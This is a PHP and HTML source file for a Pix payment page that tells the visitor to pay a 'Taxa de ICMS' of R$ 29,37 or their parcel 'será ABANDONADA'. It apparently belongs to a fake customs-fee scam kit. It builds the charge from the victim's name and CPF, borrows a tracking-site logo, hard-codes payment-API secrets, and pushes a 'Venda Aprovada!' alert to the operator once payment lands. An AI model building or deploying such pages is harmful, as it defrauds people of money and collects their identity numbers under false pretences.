<?php
session_name('pagamento2');
session_start();
// ==============================================
// PARTE 1: VALIDAÇÃO DOS PARÂMETROS E REQUISIÇÃO
// ==============================================

// Validação dos parâmetros GET
if (!isset($_GET['nome']) || !isset($_GET['cpf'])) {
    die("Erro: Parâmetros incompletos. A URL deve conter ?nome=XXX&cpf=XXX");
}

$nome = filter_input(INPUT_GET, 'nome', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$cpf = filter_input(INPUT_GET, 'cpf', FILTER_SANITIZE_FULL_SPECIAL_CHARS);

$nome = trim($nome);
$cpf = trim($cpf);
$cpf = preg_replace('/\D/', '', $cpf);
if (strlen($cpf) !== 11) {
    die("Erro: CPF inválido. Deve conter 11 dígitos.");
}

// Checa se já existe um Pix salvo para esse CPF na sessão
if (isset($_SESSION['pix'][$cpf])) {
    $pixResponse = $_SESSION['pix'][$cpf];
} else {
    // Se não, faz a requisição à API
    $url = "https://checkout.mangofy.com.br/api/v1/payment";
    $headers = [
        "Authorization: 2e27d2b478018a65863b6d34fd7f10873llcpfrd2gbyf4a20zjxs8yhtflfsa1",
        "Store-Code: 368acad51c8697fd8b92b94dbc7a2fb8",
        "Content-Type: application/json",
        "Accept: application/json"
    ];

    $data = [
        "store_code" => "368acad51c8697fd8b92b94dbc7a2fb8",
        "external_code" => uniqid("pg3_"),
        "payment_method" => "pix",
        "payment_format" => "regular",
        "installments" => 1,
        "payment_amount" => 2937,
        "postback_url" => "https://portalexpressobr.site/webhook-mangofy.php",
        "pix" => [
            "expires_in_days" => 1
        ],
        "items" => [
            [
                "code" => "1",
                "name" => "Taxa",
                "amount" => 2937,
                "total" => 1
            ]
        ],
        "customer" => [
            "email" => "RBR@email.com",
            "name" => $nome,
            "document" => $cpf,
            "phone" => "16987854787",
            "ip" => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'
        ]
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);
    curl_close($ch);

    $pixResponse = json_decode($response, true);

    // Salva a resposta na sessão para evitar nova geração
    $_SESSION['pix'][$cpf] = $pixResponse;
}

// Verifica se obteve resposta válida
$paymentCode = $pixResponse['payment_code'] ?? '';
if (empty($paymentCode)) {
    die("Erro: Não foi possível gerar o Pix. Resposta da API: " . htmlspecialchars($response));
}

// ==============================================
// PARTE 2: EXIBIÇÃO DO PIX PARA O USUÁRIO
// ==============================================
$valor = '10,00'; // Valor fixo em R$ 10,00
$pixLink = $pixResponse['pix']['pix_link'] ?? '';
$pixPayload = $pixResponse['pix']['pix_qrcode_text'] ?? '';

function formatarCPF($cpf) {
    return preg_replace('/(\d{3})(\d{3})(\d{3})(\d{2})/', '$1.$2.$3-$4', $cpf);
}

?>
<html>
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Pagamento PIX</title>
    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rawline', sans-serif;
        }
        body {
            background-color: #f8f9fa;
            padding-top: 60px;
            color: #333333;
            font-size: 15px;
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 20px;
            background-color: white;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: 60px;
        }
        .logo {
            width: 140px;
            height: auto;
        }
        .header-icons {
            display: flex;
            gap: 15px;
        }
        .header-icon {
            font-size: 18px;
            color: #0056b3;
        }
        .container {
            max-width: 600px;
            margin: 7px auto;
            padding: 0 14px;
            flex: 1;
        }
        .payment-info {
            background: #e8eced;
            padding: 12px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 13px;
            border-left: 4px solid #0c326f;
        }
        .payment-info h3 {
            color: #0c326f;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 1px;
        }
        .qr-container {
            text-align: center;
            margin: 10px 0;
            padding: 12px;
            background: #e8eced;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #0c326f;
            margin-bottom: 13px;
        }
        .qr-container2 {
            text-align: center;
            margin: 7px 0;
            padding: 4px;
            background: #e8eced;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #0c326f;
        }
        .qr-code {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 4px;
        }
        .pix-code {
            background: #d2d6d9;
            padding: 10px;
            border-radius: 4px;
            margin: 0px 0;
            font-family: monospace;
            word-break: break-all;
            border: 1px dashed #dee2e6;
        }
        .copy-button {
            width: 100%;
            padding: 12px;
            background-color: #0c326f;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
            transition: all 0.3s ease;
        }
        .copy-button:hover {
            background-color: #092555;
            transform: translateY(-1px);
        }
        .warning-box {
            background-color: #FA8E29;
            border: 1px solid #ffeeba;
            color: #ffffff;
            padding: 8px;
            border-radius: 8px;
            margin-bottom: 13px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }
        .warning-box h2 {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 0px;
        }
        .warning-box p {
            font-size: 15px;
            margin-bottom: 0px;
        }
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #f11227;
            margin-top: -6px;
            margin-bottom: -6px;
        }
        .footer {
            background-color: #FFE600;
            color: #0c326f;
            padding: 16px 0; /* Mantém padding vertical, remove horizontal */
            text-align: center;
            margin-top: 22px;
            width: 100vw; /* Força largura total da viewport */
            position: relative;
            left: 50%; /* Posiciona à esquerda da tela */
            right: 50%; /* Posiciona à direita da tela */
            margin-left: -50vw; /* Corrige posicionamento */
            margin-right: -50vw; /* Corrige posicionamento */
            margin-bottom: -6px;
            box-shadow: 0 -1px 3px rgba(0,0,0,0.1); /* Opcional: sombra sutil */
        }
        .footer-logo {
            width: 100px;
            margin: 0 auto 8px;
            display: block;
        }
        .qr-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: fit-content;
            margin: 0 auto;
        }
        .qr-content h3 {
            color: #0c326f;
            font-size: 1.1rem;
            margin-bottom: 5px;
            font-weight: 600;
            text-align: center;
        }
        .qr-code-wrapper {
            background: white;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #f0f0f0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
        }
    </style>
</head>
<body>
    <div class="header">
        <img alt="teste do brasil" class="logo" src="https://encomendagarantida.com/rastreio/encomenda/images/1.png"/>
        <div class="header-icons">
            <i class="fas fa-search header-icon"></i>
            <i class="fas fa-question-circle header-icon"></i>
            <i class="fas fa-adjust header-icon"></i>
        </div>
    </div>

    <div class="container">
        <div class="warning-box">
            <h2>Atenção!</h2>
            <p></p> 
            <p></p>
            <p>Regularize o ICMS, para liberação do seu pedido,</p>
            <p><strong>Caso contrário sua encomenda será ABANDONADA!</strong></p>
        </div>

        <div class="payment-info">
            <h3>Taxa de ICMS</h3>
            <p><strong>Detalhes do Pagamento</strong> </p>
            <p><strong>Nome:</strong> <?php echo htmlspecialchars($nome); ?></p>
            <p><strong>CPF:</strong> <?php echo formatarCPF($cpf); ?></p>
            <p><strong>Valor:</strong> R$ 29,37</p>
        </div>

        <div class="qr-container">
            <div style="margin: 5px 0;">
                <p style="margin-bottom: 6px; font-weight: 600;">Copie o código PIX:</p>
                <div id="pixCode" class="pix-code">
                    <?php echo htmlspecialchars($pixPayload); ?>
                </div>
                <button onclick="copyPixCode()" class="copy-button">
                    <i class="fas fa-copy"></i>
                    Copiar código PIX
                </button>
            </div>
        </div>        
        <!-- Container 2: QR Code -->
        <div class="qr-container2">
            <div class="qr-content">
                <h3>Escaneie o QR Code PIX</h3>
            <div class="qr-code-wrapper">
                    <div id="qrCode"></div>
                </div>
            </div>
        </div>
        <div id="paymentStatus" style="display: none;"></div>
    <footer class="footer">
        <img src="https://encomendagarantida.com/rastreio/encomenda/images/1.png" alt="teste do brasil Logo" class="footer-logo">
        <p>© 2025 do Brasil. Todos os direitos reservados.</p>
    </footer>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        var pixCopiaCola = <?php echo json_encode($pixPayload); ?>;
        var qrCodeDiv = document.getElementById("qrCode");

        qrCodeDiv.innerHTML = "";

        if (pixCopiaCola && pixCopiaCola.trim() !== "" && pixCopiaCola !== "DEU MERDA") {
            new QRCode(qrCodeDiv, {
                text: pixCopiaCola,
                width: 160,
                height: 160,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        } else {
            qrCodeDiv.innerHTML = "<p style='color:red;'>Erro ao gerar QR Code</p>";
        }
    });
    </script>

    <script>
            window.copyPixCode = function() {
                const pixCode = document.getElementById('pixCode').textContent.trim();
                const copyButton = document.querySelector('.copy-button');
                navigator.clipboard.writeText(pixCode).then(
                    function() {
                        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
                        copyButton.style.backgroundColor = '#28a745';
                        setTimeout(() => {
                            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
                            copyButton.style.backgroundColor = '#0c326f';
                        }, 2000);
                    },
                    function(err) {
                        console.error('Erro ao copiar:', err);
                        copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
                        copyButton.style.backgroundColor = '#dc3545';
                    }
                );
            }
    </script>

<script>
    document.addEventListener("DOMContentLoaded", function () {
        const paymentCode = '<?= $paymentCode ?>';
        let checkCount = 0;
        const maxChecks = 100;
        let notificationSent = false;

        function checkPaymentStatus() {
            if (checkCount >= maxChecks) {
                document.getElementById('paymentStatus').innerHTML =
                    'Status: Tempo esgotado (pagamento não identificado)';
                return;
            }

            fetch(`/payment.php?payment_code=${paymentCode}`)
                .then(response => {
                    if (!response.ok) throw new Error('Erro na rede');
                    return response.json();
                })
                .then(data => {
                    checkCount++;
                    console.log(`Verificação ${checkCount}/${maxChecks} em andamento...`);

                    if (!data.success) {
                        console.error('Erro na API:', data.error || 'Erro desconhecido');
                        throw new Error(data.error || 'Erro na verificação');
                    }

                    if (data.payment_status === 'approved') {
                        // Envia a notificação de pagamento confirmado (apenas uma vez)
                        if (!notificationSent) {
                            fetch("https://api.pushcut.io/wciBAFXDTHO-VzCOtbMzP/notifications/RBRUP1", {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    title: "Venda Aprovada!",
                                    message: "Seu pagamento via Pix foi processado com sucesso."
                                })
                            })
                            .then(() => {
                                console.log("📲 Notificação de Pagamento Confirmado enviada!");
                                notificationSent = true;
                            })
                            .catch(error => console.error("❌ Erro ao enviar notificação de Pagamento Confirmado:", error));
                        }

                        document.getElementById('paymentStatus').className = 'status approved';
                        document.getElementById('paymentStatus').innerHTML =
                            'Status: Pagamento aprovado! Redirecionando...';

                        const urlParams = new URLSearchParams(window.location.search);
                        const cpf = urlParams.get('cpf');
                        const nome = urlParams.get('nome');

                        const cpfParam = encodeURIComponent(cpf);
                        const nomeParam = encodeURIComponent(nome);

                        setTimeout(() => {
                            window.location.href = `/chat?cpf=${cpfParam}&nome=${nomeParam}`;
                        }, 3000);
                    } else {
                        document.getElementById('paymentStatus').innerHTML =
                            `Status: ${data.payment_status} (${checkCount}/${maxChecks})`;
                        setTimeout(checkPaymentStatus, 3000);
                    }
                })
                .catch(error => {
                    console.error('Erro na verificação:', error);
                    document.getElementById('paymentStatus').innerHTML =
                        `Status: Erro na verificação (${checkCount}/${maxChecks})`;
                    setTimeout(checkPaymentStatus, 3000);
                });
        }

        checkPaymentStatus();
    });
</script>
</body>
</html>